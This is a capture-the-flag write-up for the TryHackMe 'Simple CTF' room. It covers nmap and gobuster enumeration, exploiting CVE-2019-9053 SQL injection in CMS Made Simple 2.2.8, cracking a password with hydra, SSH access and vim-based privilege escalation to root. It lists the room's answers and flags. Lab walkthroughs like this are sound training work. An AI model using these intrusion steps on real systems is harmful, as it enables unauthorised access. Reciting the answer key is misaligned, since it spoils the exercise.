
![[logo.png]]

Link: https://tryhackme.com/r/room/easyctf

# Task 1 - Simple CTF 


1. **How many services are running under port 1000?**
```bash
sudo nmap -sS -p- 10.10.76.159 -oN simplectf.txt -T4
```

```bash
PORT     STATE SERVICE
21/tcp   open  ftp
80/tcp   open  http
2222/tcp open  EtherNetIP-1

Nmap done: 1 IP address (1 host up) scanned in 417.03 seconds
```

>2 ports open under port 1000

2. **What is running on the higher port?**

```bash
sudo nmap -A -p2222 10.10.76.159 
```

```bash
PORT     STATE SERVICE VERSION
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
```

>SSH

Navigate to http://10.10.76.159/ and its nothing special here.

![[img-1.png]]

Use `gobuster` for directory scanning and I've found a directory called `/simple`.

![[img-2.png]]

Navigate to http://10.10.76.159/simple and scroll to the bottom. Noticed that it's using CMS Made Simple with version 2.2.8

![[img-3.png]]

![[img-4.png]]

Search for vulnerability using `searchsploit`.

![[img-5.png]]


3. **What's the CVE you're using against the application?**

![[img-6.png]]
>CVE-2019-9053

4. **To what kind of vulnerability is the application vulnerable?**
>SQLi

5. **What's the password?**
```bash
 python exploit.py -u http://10.10.76.159/simple/ --crack -w /usr/share/wordlists/rockyou.txt
```

![[img-8.png]]

It keep crashing but luckily we got the username so I decided to crack it using hydra.

![[img-7.png]]
>secret


6. Where can you login with the details obtained?

![[img-9.png]]
>ssh

7. What's the user flag?
>G00d j0b, keep up!

8. Is there any other user in the home directory? What's its name?
```ssh
$ pwd
/home/mitch
$ cd /home
$ ls
mitch  sunbath
```
>sunbath

9. What can you leverage to spawn a privileged shell?
![[img-10.png]]
>vim

10. What's the root flag?
```ssh
# cd /root
# pwd
/root
# ls
root.txt
# cat root.txt
W3ll d0n3. You made it!
```
>W3ll d0n3. You made it!
